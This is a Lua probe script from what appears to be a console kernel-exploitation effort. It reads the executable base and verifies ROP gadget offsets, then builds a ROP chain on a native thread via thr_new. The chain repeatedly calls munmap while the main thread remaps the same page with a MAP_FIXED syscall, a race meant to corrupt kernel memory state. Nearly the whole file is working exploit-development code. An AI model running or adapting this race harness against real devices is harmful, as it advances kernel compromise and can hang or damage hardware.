-- CRASH_CLASS: HIGH
-- PROBE 1528b: sustained wave-spawned munmap race against 548 op-3 MAP_FIXED
--
-- Context: 1517a/[C] and 1518a/[C] proved a *Lua* thread running a syscall
-- loop dies on its own, so every earlier racing phase proves nothing. The only
-- instrument that can keep a native thread in a kernel call is the 271g child
-- ROP chain: thr_new(455) starts a thread at a bare_ret gadget and we control
-- its stack, so [pop_rdi][arg][pop_rsi][arg][pop_rax][nr][fn_addr] can be
-- repeated as many times as the stack holds.
--
-- The question: 548 op 3 with arg2 bit 0x10 (MAP_FIXED) deletes the vm_map
-- entry covering the requested 16 KiB-aligned address and inserts a fresh anon
-- one (1508a/1512a). Racing the two on the same address is a create/destroy
-- loop on one vm_map_entry.
--
-- CORRECTION 2026-11-10: the bracketed claim above used to read "munmap(V,
-- 0x1000) uses the same entry-scoped delete (1450a: a 0x1000 request removed a
-- whole 0x400000 entry)". That reading is void. The kernel page is 16 KiB
-- (1544a), 1450a mapped 0x4000 -- one page -- and then queried 547 at base,
-- base+0x1000, base+0x2000 and base+0x3000, which are four addresses inside
-- that single page. 1544a measured the real behaviour on a sixteen-page 0x40000
-- entry: 73(base+0x10000, 0x4000) removed exactly that one page and left the
-- other fifteen mapped at prot 3. munmap is page-precise, not entry-scoped, so
-- the race below is a page create/destroy loop rather than an entry one.
--
-- 1528a ran this once and saw a single collision: the child's 8000 munmaps
-- finished inside the first few main-thread rounds, because an already-unmapped
-- munmap returns EINVAL in microseconds. This version keeps the racy side alive
-- for the whole run by spawning a fresh 2000-call child every WAVE rounds, so
-- collisions are counted over the entire window instead of the first 2 ms.
--
-- A real bug here can corrupt page tables and hang the console: the failure
-- mode is a hard power-off, not a loader death. Everything is printed before
-- it is attempted so a truncated capture still names the phase.
--
-- prior art: probes/phase17_new_vectors/271g_child_thread_rop_kqueue_race.lua (child ROP harness)
-- prior art: probes/phase36_realargs/1508a_sys548_map_fixed.lua (op 3 honours MAP_FIXED)
-- prior art: probes/phase36_realargs/1512a_sys548_op3_split.lua (op 3 splits the entry)
-- prior art: probes/phase36_realargs/1517a_sys548_op3_race_bisect.lua (Lua thread cannot race)
-- prior art: probes/phase36_realargs/1518a_child_thread_stability.lua (Lua thread dies alone)
-- prior art: probes/phase36_realargs/1528a_native_race_op3_munmap.lua (single-wave version, 1 collision)
-- prior art: docs/DEVICE_WINDOW_14_10.md section 9-11

print("=== PROBE 1528b: sustained munmap vs 548 op 3 ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rdq(a)
    local lo = rd(a); if not lo then return nil end
    local hi = rd(a + 4); if not hi then return nil end
    return hi * 4294967296 + lo
end
local function hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end
local function fa(v)
    if v == nil then return "nil" end
    local h, l = hi_lo(v)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fa(stub))

local pidv = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pidv)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pidv end

local sc_mmap = mk(477)
local sc_munmap = mk(73)
local sc_547 = mk(547)
local sc_593 = mk(593)
local sc_thr_new = mk(455)

-- [A] eboot base + gadget scan
print("")
print("[A] eboot base + gadget scan")
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() sc_593(uint64(0), info) end)
local elo = rd(N(info) + 0x108)
local ehi = rd(N(info) + 0x10C)
if not elo or not ehi then print("ABORT: no eboot base"); return end
local eboot = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fa(eboot))

local scan_base = N(eboot)

-- An exhaustive scan is both slow and fragile: memory.read_dword raises a Lua
-- error (caught here as nil) on an unmapped hole, and 271g's `break` on the
-- first nil is why it never reached pop_rdi at eboot+0xC9DFE even though that
-- offset is inside its 2 MB window. The catalog offsets are verified directly
-- instead: read the bytes at each offset and accept the gadget only if they
-- match. Only a failed population falls back to scanning.
local function bytes_at(off, n)
    local out = {}
    for i = 0, n - 1 do
        local w = rd(scan_base + off + (i - (i % 4)))
        if not w then return nil end
        local sh = (i % 4) * 8
        out[i + 1] = math.floor(w / 2 ^ sh) % 256
    end
    return out
end
local function verifies(off, sig)
    local b = bytes_at(off, #sig)
    if not b then return false end
    for i = 1, #sig do if b[i] ~= sig[i] then return false end end
    return true
end

-- pop rax / pop rdi / pop rsi have a `pop <reg>; ret` form and, for rdi/rsi, a
-- `pop <reg>; pop rbp; ret` form that costs one extra dummy qword.
local pop_rax = nil
if verifies(0x992, {0x58, 0xC3}) then pop_rax = 0x992 end
local pop_rdi, rdi_extra = nil, 0
if verifies(0xC9DFE, {0x5F, 0xC3}) then pop_rdi, rdi_extra = 0xC9DFE, 0
elseif verifies(0x169, {0x5F, 0x5D, 0xC3}) then pop_rdi, rdi_extra = 0x169, 8 end
local pop_rsi, rsi_extra = nil, 0
if verifies(0xD77D, {0x5E, 0xC3}) then pop_rsi, rsi_extra = 0xD77D, 0
elseif verifies(0x78, {0x5E, 0x5D, 0xC3}) then pop_rsi, rsi_extra = 0x78, 8 end
local bare = nil
if verifies(0x42, {0xC3}) then bare = 0x42 end

print(string.format("  pop_rax=%s pop_rdi=%s(+%d) pop_rsi=%s(+%d) bare=%s",
    pop_rax and string.format("eboot+0x%X", pop_rax) or "NONE",
    pop_rdi and string.format("eboot+0x%X", pop_rdi) or "NONE", rdi_extra,
    pop_rsi and string.format("eboot+0x%X", pop_rsi) or "NONE", rsi_extra,
    bare and string.format("eboot+0x%X", bare) or "NONE"))
if not (pop_rax and pop_rdi and pop_rsi and bare) then
    print("ABORT: catalog gadget verification failed; nothing sent that could corrupt the stack")
    return
end
local g_rax = eboot + pop_rax
local g_rdi = eboot + pop_rdi
local g_rsi = eboot + pop_rsi
local g_ret = eboot + bare

if not alive() then print("DEAD after scan"); return end

-- [B] victim window
print("")
print("[B] victim window")
local VSZ = 0x10000
local vrv = sc_mmap(uint64(0), uint64(VSZ), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local V = N(vrv)
print("  mmap -> " .. fa(vrv))
if V < 0x10000 then print("ABORT: no victim"); return end
local function prot_of(a)
    local rec = memory.alloc(0x20)
    local r = sc_547(uint64(a), rec)
    if N(r) ~= 0 then return -1 end
    return rd(N(rec) + 0x10)
end
print("  547 prot=" .. tostring(prot_of(V + 0x100)))
wd(V + 0x100, 0x11223344)
print("  canary=" .. string.format("0x%08X", rd(V + 0x100) or 0))
if not alive() then print("DEAD after victim"); return end

-- [C] reusable child chain + spawner
print("")
print("[C] child chain")
local ITERS = 2000
local STACKSZ = 0x4000
local chain_bytes = (rdi_extra + 16 + rsi_extra + (ITERS - 1) * 24 + 40)
local stack_mem = memory.alloc(STACKSZ + chain_bytes + 0x200)
local sb = N(stack_mem)
local rsp = sb + STACKSZ - 8
wd(sb, 0)

local q = 0
local function put(v) wq(rsp + q * 8, v); q = q + 1 end
put(g_rdi); put(uint64(V)); if rdi_extra > 0 then put(g_ret) end
put(g_rsi); put(uint64(0x1000)); if rsi_extra > 0 then put(g_ret) end
put(g_rax); put(uint64(73)); put(stub)
for i = 2, ITERS do
    put(g_rax); put(uint64(73)); put(stub)
end
put(g_rdi); put(uint64(0)); if rdi_extra > 0 then put(g_ret) end
put(g_rax); put(uint64(431)); put(stub)
for i = 1, 8 do put(g_ret) end
print(string.format("  stack=%s rsp=%s iters=%d qwords=%d", fa(uint64(sb)), fa(uint64(rsp)), ITERS, q))

local param = memory.alloc(0x40)
local pa = N(param)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa + 0x00, g_ret)
wq(pa + 0x08, uint64(V))
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(STACKSZ))
local ctid = memory.alloc(8)
wq(N(ctid), uint64(0))
wq(pa + 0x30, ctid)

local spawned, spawn_fail = 0, 0
local function spawn_child()
    wq(N(ctid), uint64(0))
    local ok2, rv2 = pcall(function() return sc_thr_new(param, uint64(0x38)) end)
    local r = ok2 and N(rv2) or -999
    if r == 0 then spawned = spawned + 1 else spawn_fail = spawn_fail + 1 end
    return r
end

-- [D] sustained race
print("")
print("[D] sustained race: child wave every 8 rounds")
local ent = memory.alloc(0x40)
local ea = N(ent)
local done = memory.alloc(8)
local da = N(done)
local sc548 = mk(548)
local function remap(protn)
    for i = 0, 0x3C, 4 do wd(ea + i, 0) end
    wq(ea + 0x00, uint64(V))
    wq(ea + 0x10, uint64(VSZ))
    wd(ea + 0x18, protn)
    wd(ea + 0x1C, 3)
    wd(da, 0xEEEEEEEE)
    local rv = -999
    pcall(function() rv = N(sc548(uint64(0), uint64(0x10), uint64(ea), uint64(1), uint64(da), uint64(0))) end)
    return rv
end

local ROUNDS = 800
local WAVE = 8
local bad_place, bad_prot, nonzero_before, samples, collisions = 0, 0, 0, 0, 0
print("  first spawn: ret=" .. spawn_child() .. " tid=" .. tostring(rd(N(ctid))))
for i = 1, ROUNDS do
    if i % WAVE == 0 then spawn_child() end
    local rv = remap(3)
    if N(rv) ~= V then bad_place = bad_place + 1 end
    if i % 10 == 0 then
        local p = prot_of(V + 0x100)
        if p ~= 3 then
            collisions = collisions + 1
        else
            local d0 = rd(V + 0x200)
            local d1 = rd(V + 0x204)
            local d2 = rd(V + 0x800)
            if d0 or d1 or d2 then
                samples = samples + 1
                if (d0 and d0 ~= 0) or (d1 and d1 ~= 0) or (d2 and d2 ~= 0) then
                    nonzero_before = nonzero_before + 1
                    print(string.format("  *** ROUND %d NON-ZERO BEFORE WRITE: %s %s %s",
                        i, d0 and string.format("0x%08X", d0) or "nil",
                        d1 and string.format("0x%08X", d1) or "nil",
                        d2 and string.format("0x%08X", d2) or "nil"))
                end
            end
        end
    end
    if i % 100 == 0 then
        local p2 = prot_of(V + 0x100)
        if p2 ~= 3 then bad_prot = bad_prot + 1 end
        print(string.format("  round %d: rv=%s prot=%s bad[place=%d prot=%d] nz=%d/%d collisions=%d spawned=%d fail=%d",
            i, fa(uint64(N(rv))), tostring(p2), bad_place, bad_prot, nonzero_before, samples,
            collisions, spawned, spawn_fail))
    end
end
print(string.format("  done: bad_place=%d bad_prot=%d nonzero_before_write=%d/%d collisions=%d spawned=%d spawn_fail=%d",
    bad_place, bad_prot, nonzero_before, samples, collisions, spawned, spawn_fail))

-- [E] verdict
print("")
print("[E] verdict")
local pfin = prot_of(V + 0x100)
print("  547 final prot=" .. tostring(pfin))
if pfin == 3 then
    wd(V + 0x100, 0xAABBCCDD)
    print("  final mark=" .. string.format("0x%08X", rd(V + 0x100) or 0))
else
    print("  final mark=skipped (entry not present after the race)")
end
local ok_u = pcall(function() return sc_munmap(uint64(V), uint64(VSZ)) end)
print("  munmap ok=" .. tostring(ok_u))
print("  alive=" .. tostring(alive()) .. " pid=" .. N(native.fcall_with_rax(stub, 20)))
print("")
print("=== PROBE 1528b COMPLETE ===")
